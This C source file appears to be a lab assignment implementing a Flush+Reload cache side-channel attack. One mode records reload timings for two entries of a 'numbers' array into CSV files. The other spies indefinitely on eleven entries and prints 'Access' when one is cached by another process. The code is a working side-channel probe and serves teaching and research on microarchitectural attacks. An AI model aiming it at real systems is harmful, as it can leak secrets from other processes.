#include <inttypes.h>
#include <stdlib.h>
#include <stdio.h>
#include "time.h"
#include <string.h>
#include <unistd.h>
#include <stdint.h> 

#include "probe.h"

#define ITERATION_COUNT (1000) 					// Used for part 2a
#define THRESHOLD_RENEWAL_LOOP (15000000)		// Microseconds

void print_results_to_file(char *nme, uint64_t *arr){
	int j=0;
	char snum[50];
	FILE *fp;
	fp = fopen(nme, "w+");
    for(j = 0; j < ITERATION_COUNT; j++) {
		sprintf(snum, "%ld",arr[j]);
		strcat(snum, " ");
		fputs(snum, fp);
    }
    fputs("\n", fp);
    for(j = 0; j < ITERATION_COUNT; j++) {
		sprintf(snum, "%d",j+1);
		strcat(snum, " ");
    	fputs(snum, fp);
    }
    fclose(fp);
}


void task_2_a(){

	uint64_t pr_5_time[ITERATION_COUNT];
	uint64_t pr_7_time[ITERATION_COUNT];

	for(int i=0; i<ITERATION_COUNT; i++){
		pr_7_time[i] = reload(numbers[7]);
		pr_5_time[i] = reload(numbers[5]);
		flush(numbers[7]);
		flush(numbers[5]);
		usleep(2);
	}
	print_results_to_file("Probe-numbers[5].csv", pr_5_time);
	print_results_to_file("Probe-numbers[7].csv", pr_7_time);
	return;
}



void task_2_b(){
	
    int LOOPFOREVER = 1;
    int numbers_size = 11; // numbers variable indexes to check

    // Perform actual flush and reload on numbers variable
    const void *numbers_addr;
    uint64_t number_access_time;
    int access_detected = 0;

    // Determine detection threshold
    int DETECTION_THRESHOLD = determing_tsc_threshold(1000);

	struct timespec start, end;
	uint64_t delta_us;
	int tsc_flag;


    while(LOOPFOREVER){

    		clock_gettime(CLOCK_MONOTONIC_RAW, &start);
    		tsc_flag=1;

    		while(tsc_flag){

            for (int i = 0; i < numbers_size; ++i)
            {
                numbers_addr = numbers[i+1];
                number_access_time = flush_and_reload(numbers_addr);

                if(number_access_time < DETECTION_THRESHOLD){
                    access_detected = 1;
                    break;// exit loop if any of the numbers array indexes was detected to be cached
                }
                // printf("Access Time for %d : %lu\n", i, number_access_time);
            }
            if(access_detected){
                printf("Access\n");
            }
            access_detected = 0;

			clock_gettime(CLOCK_MONOTONIC_RAW, &end);
			delta_us = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_nsec - start.tv_nsec) / 1000; //microseconds
			if(delta_us>THRESHOLD_RENEWAL_LOOP){
				tsc_flag=0;
			}
		}
		DETECTION_THRESHOLD = determing_tsc_threshold(100);

    }
}


int main(int argc, char *argv[]) {


    if(argc<=1) 
    { 
        task_2_b();

    }else
    {
    	task_2_a();
        
    }

	
}
